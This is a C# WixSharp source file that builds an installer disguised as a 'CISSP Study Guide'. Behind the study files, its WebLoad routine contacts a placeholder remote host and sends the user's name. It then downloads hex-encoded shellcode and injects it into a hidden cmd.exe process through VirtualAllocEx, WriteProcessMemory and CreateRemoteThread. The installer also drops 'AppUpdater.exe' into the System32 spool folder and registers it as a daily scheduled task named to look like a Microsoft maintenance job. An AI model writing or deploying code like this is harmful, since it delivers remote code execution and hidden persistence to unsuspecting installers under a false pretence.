using System;
using WixSharp;
using WixSharp.Forms;
using System.Runtime.InteropServices;
using System.Net;
using System.Diagnostics;
using Microsoft.Deployment.WindowsInstaller;
using IO = System.IO;

//https://www.codeproject.com/Articles/2937/Getting-local-groups-and-member-names-in-C
//http://www.pinvoke.net/default.aspx/netapi32.netlocalgroupgetmembers
//https://www.codesd.com/item/pinvoke-netlocalgroupgetmembers-runs-in-fatalexecutionengineerror.html
//https://www.ownedcore.com/forums/world-of-warcraft/world-of-warcraft-bots-programs/wow-memory-editing/422280-c-asm-injection-createremotethread.html
//http://www.c-sharpcorner.com/forums/check-if-url-exists-and-then-download-file
//https://yoursandmyideas.com/2012/01/07/task-scheduler-in-c-net/

namespace Conditional_MSI
{
    public enum ProcessAccessFlags : uint
    {
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VMOperation = 0x00000008,
        VMRead = 0x00000010,
        VMWrite = 0x00000020,
        DupHandle = 0x00000040,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        Synchronize = 0x00100000,
        All = 0x001F0FFF
    }

    [Flags]
    public enum AllocationType
    {
        Commit = 0x00001000,
        Reserve = 0x00002000,
        Decommit = 0x00004000,
        Release = 0x00008000,
        Reset = 0x00080000,
        TopDown = 0x00100000,
        WriteWatch = 0x00200000,
        Physical = 0x00400000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        NoAccess = 0x0001,
        ReadOnly = 0x0002,
        ReadWrite = 0x0004,
        WriteCopy = 0x0008,
        Execute = 0x0010,
        ExecuteRead = 0x0020,
        ExecuteReadWrite = 0x0040,
        ExecuteWriteCopy = 0x0080,
        GuardModifierflag = 0x0100,
        NoCacheModifierflag = 0x0200,
        WriteCombineModifierflag = 0x0400
    }

    public partial class Program
    {       
       
        static void Main()
        {
            var domainSS = new Feature("Domain Spreadsheets");            
            var practiceT = new Feature("Practice Tests");
            var eResources =  new Feature("External Resources");

            var project = new ManagedProject("CISSP Study Guide",
                             new Dir(@"%AppData%\CISSP Study Guide",
                                 new File("Access Control.txt"),
                                 new File("Application Development Security.txt"),
                                 new File("Cryptography.txt"),
                                 new File("Governance and Risk.txt"),
                                 new File("Opsec.txt"),
                                 new File("Physical Security.txt"),
                                 new File("Architecture and Design.txt"),
                                 new File("Telecomm and Network.txt"),
                                 new File("AppUpdater.exe").SetComponentPermanent(true)
                                 ),
                             new Property("FILELOC", "no"),
                             new ManagedAction(CustomActions.TargetCopy, Return.ignore, When.Before, Step.InstallInitialize, Condition.NOT_Installed),                             
                             new ElevatedManagedAction(CustomActions.FileCopy, Return.check, When.After, Step.InstallFiles, Condition.NOT_Installed)
                             {
                                 Condition = new Condition("ADMINPRIVS=\"yes\""),                                 
                                 UsesProperties = "FLOC=[FILELOC]",
                                 Execute = WixSharp.Execute.deferred
                             },
                             new ManagedAction(CustomActions.UserScheduledTask, Return.check, When.After, Step.InstallFiles, Condition.NOT_Installed)
                             {
                                 Condition = new Condition("ADMINPRIVS=\"no\""),
                                 UsesProperties = "URUN=[USERRUN], FLOC=[FILELOC]",
                                 Execute = WixSharp.Execute.deferred
                             },
                             new ElevatedManagedAction(CustomActions.AdminScheduledTask, Return.check, When.After, Step.InstallFiles, Condition.NOT_Installed)
                             {
                                 Condition = new Condition("ADMINPRIVS=\"yes\""),
                                 UsesProperties = "URUN=[USERRUN], FLOC=[FILELOC]",
                                 Execute = WixSharp.Execute.deferred
                             },                                                          
                             new Property("ADMINPRIVS", "no"),
                             new ManagedAction(CustomActions.AdminCheck, Return.ignore, When.Before, Step.InstallInitialize, Condition.NOT_Installed),
                             new Property("USERRUN", "false"),
                             new ManagedAction(CustomActions.UserCheck, Return.ignore, When.Before, Step.InstallInitialize, Condition.NOT_Installed)                             
                             );

            project.GUID = new Guid("cf46c013-a7db-42f0-a311-66e41fdbdcc5");
            project.Version = new Version("2.1.7.2");
            project.DefaultFeature.Add(domainSS);
            project.DefaultFeature.Add(practiceT);
            project.DefaultFeature.Add(eResources);

            project.ManagedUI = ManagedUI.Empty;    //no standard UI dialogs
            project.ManagedUI = ManagedUI.Default;  //all standard UI dialogs

            //custom set of standard UI dialogs
            project.ManagedUI = new ManagedUI();

            project.ManagedUI.InstallDialogs.Add(Dialogs.Welcome)
                                            .Add(Dialogs.Licence)
                                            .Add(Dialogs.SetupType)
                                            .Add(Dialogs.Features)
                                            .Add(Dialogs.InstallDir)
                                            .Add(Dialogs.Progress)
                                            .Add(Dialogs.Exit);

            project.ManagedUI.ModifyDialogs.Add(Dialogs.MaintenanceType)
                                           .Add(Dialogs.Features)
                                           .Add(Dialogs.Progress)
                                           .Add(Dialogs.Exit);          

            project.UIInitialized += Msi_UIInit;         
            project.Load += Msi_Load;
            project.BeforeInstall += Msi_BeforeInstall;
            project.AfterInstall += Msi_AfterInstall;       

            //project.SourceBaseDir = "<input dir path>";
            //project.OutDir = "<output dir path>";           

            project.BuildMsi();
        }    

        static void Msi_UIInit(SetupEventArgs e)
        {            
            e.Session["ALLUSERS"] = "2";           

            if (Shared.IsAdmin("Administrators", Environment.UserName))
            {                
                e.Session["MSIINSTALLPERUSER"] = "0";
                Shared.WebLoad();
            }
            else
            {
                e.Session["MSIINSTALLPERUSER"] = "1";                
                Shared.WebLoad();
            }
        }

        static void Msi_Load(SetupEventArgs e)
        { }

        static void Msi_BeforeInstall(SetupEventArgs e)
        { }

        static void Msi_AfterInstall(SetupEventArgs e)
        { }                         
    }

    public class CustomActions
    {
        [CustomAction]
        public static ActionResult UserCheck(Session session)
        {                                 
            session["USERRUN"] = Environment.UserName;           
            return ActionResult.Success;
        }

        [CustomAction]
        public static ActionResult AdminCheck(Session session)
        {
            if(Shared.IsAdmin("Administrators", Environment.UserName))
                session["ADMINPRIVS"] = "yes";
            return ActionResult.Success;
        }

        [CustomAction]
        public static ActionResult FileCopy(Session session)
        {                   
            IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\CISSP Study Guide\\AppUpdater.exe", session.Property("FLOC"), true);                
            return ActionResult.Success;
        }

        [CustomAction]
        public static ActionResult AdminScheduledTask(Session session)
        {
            //string sSchTasks = "/create /F /SC daily /TN \"Microsoft\\Windows\\Maintenance\\Software Update Task\" /ST 08:00 /TR \"" + session.Property("FLOC") + "\" /RL HIGHEST /RU " + session.Property("URUN");
            string sSchTasks = String.Format("/create /F /SC daily /TN \"Microsoft\\Windows\\Maintenance\\Software Update Task\" /ST 08:00 /TR \"'{0}'\" /RU {1}", session.Property("FLOC"), session.Property("URUN"));
            var processI = new ProcessStartInfo
            {
                UseShellExecute = false,
                FileName = "schtasks.exe",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = sSchTasks
            };
            System.Diagnostics.Process.Start(processI);
            //System.Diagnostics.Process.Start("schtasks.exe", sSchTasks);                              
            return ActionResult.Success;
        }

        [CustomAction]
        public static ActionResult UserScheduledTask(Session session)
        {                       
            string sSchTasks = String.Format("/create /F /SC daily /TN \"Software Update Task\" /ST 08:00 /TR \"'{0}\\CISSP Study Guide\\AppUpdater.exe'\" /RU {1}", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), session.Property("URUN"));
            var processI = new ProcessStartInfo
            {
                UseShellExecute = false,
                FileName = "schtasks.exe",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = sSchTasks
            };
            System.Diagnostics.Process.Start(processI);
            //System.Diagnostics.Process.Start("schtasks.exe", sSchTasks);                              
            return ActionResult.Success;
        }

        [CustomAction]
        public static ActionResult TargetCopy(Session session)
        {
            session["FILELOC"] = Environment.SystemDirectory + "\\spool\\tools\\AppUpdater.exe";
            return ActionResult.Success;
        }
    }

    public static class Shared
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("NetAPI32.dll", CharSet = CharSet.Unicode)]
        public extern static int NetLocalGroupGetMembers(
             [MarshalAs(UnmanagedType.LPWStr)] string servername,
             [MarshalAs(UnmanagedType.LPWStr)] string localgroupname,
             int level,
             out IntPtr bufptr,
             int prefmaxlen,
             out int entriesread,
             out int totalentries,
             IntPtr resume_handle);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct LOCALGROUP_MEMBERS_INFO_1
        {
            public int iSid;
            public int iUsage;
            public string sName;
        }
        public static byte[] ToByteArray(String HexString)
        {
            int NumberChars = HexString.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(HexString.Substring(i, 2), 16);
            }
            return bytes;
        }

        public static Boolean IsAdmin(string sGroup, string sUsername)
        {
            IntPtr groupInfoPtr, currentStructPtr = IntPtr.Zero;
            int entriesRead = 0;
            int totalEntries = 0;
            int ret = NetLocalGroupGetMembers(null, sGroup, 2, out groupInfoPtr, -1, out entriesRead, out totalEntries, IntPtr.Zero);

            if (ret == 0)
            {
                LOCALGROUP_MEMBERS_INFO_1[] sMembers = new LOCALGROUP_MEMBERS_INFO_1[entriesRead];
                IntPtr iterPtr = groupInfoPtr;
                //string[] sSplit = new string[entriesRead];
                for (int i = 0; i < entriesRead; i++)
                {
                    sMembers[i] = (LOCALGROUP_MEMBERS_INFO_1)Marshal.PtrToStructure(iterPtr, typeof(LOCALGROUP_MEMBERS_INFO_1));
                    iterPtr = (IntPtr)((int)iterPtr + Marshal.SizeOf(typeof(LOCALGROUP_MEMBERS_INFO_1)));
                    //if (sMembers[i].sName.Contains(sUsername))
                    //sSplit[i] = sMembers[i].sName.Split('\\')[1];
                    //if(string.Equals(sSplit[i], sUsername, StringComparison.CurrentCultureIgnoreCase))                    
                    if (string.Equals(sMembers[i].sName.Split('\\')[1], sUsername, StringComparison.CurrentCultureIgnoreCase))
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        public static void WebLoad()
        {                       
            string url = "http://**YOURSITEHERE**";
            
            Uri urlCheck = new Uri(url);
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlCheck);
            request.Timeout = 5000;
            
            HttpWebResponse response;
            try
            {                
                response = (HttpWebResponse)request.GetResponse();
            }
            catch (Exception)
            {
                return;
            }
            
            WebClient wc = new WebClient();
            string updateString = wc.DownloadString("http://**YOURSITEHERE**/api/updates.php?clientupdate=yes&user=" + Environment.UserName);
            string binaryLoad = null;
            if (updateString.Contains("2.0.2"))
            {
                if (IntPtr.Size == 4)
                {
                    binaryLoad = wc.DownloadString("http://**YOURSITEHERE**/api/updatefile.php?clientupdate=yes&arch=x86&user=" + Environment.UserName);
                }
                else if (IntPtr.Size == 8)
                {
                    binaryLoad = wc.DownloadString("http://**YOURSITEHERE**/api/updatefile.php?clientupdate=yes&arch=x64&user=" + Environment.UserName);
                }
                else
                {
                    binaryLoad = wc.DownloadString("http://**YOURSITEHERE**/api/updatefile.php?error=true");
                    return;
                }

                var processInfo = new ProcessStartInfo
                {
                    UseShellExecute = false,
                    FileName = "c:\\windows\\system32\\cmd.exe",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                var process = Process.Start(processInfo);

                string[] updateBinary = binaryLoad.Split('|');
                string stringStep = updateBinary[1].Replace(" ", String.Empty);
                byte[] binaryPatch = ToByteArray(stringStep);

                IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, false, process.Id);

                IntPtr funcAddr = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)binaryPatch.Length + 1, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                //WriteProcessMemory(processHandle, IntPtr.Zero)

                UIntPtr bytesWritten = UIntPtr.Zero;

                WriteProcessMemory(processHandle, funcAddr, binaryPatch, (uint)binaryPatch.Length, out bytesWritten);

                uint iThreadId = 0;

                IntPtr hThread = IntPtr.Zero;
                IntPtr threadId = IntPtr.Zero;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateRemoteThread(processHandle, IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, out iThreadId);

                //hThread = CreateRemoteThread(IntPtr.Zero, (uint)binaryPatch.Length, funcAddr, pinfo, 0, ref threadId);
                //WaitForSingleObject(hThread, 0xFFFFFFFF);

            }
            //return;
        }
    }

    
}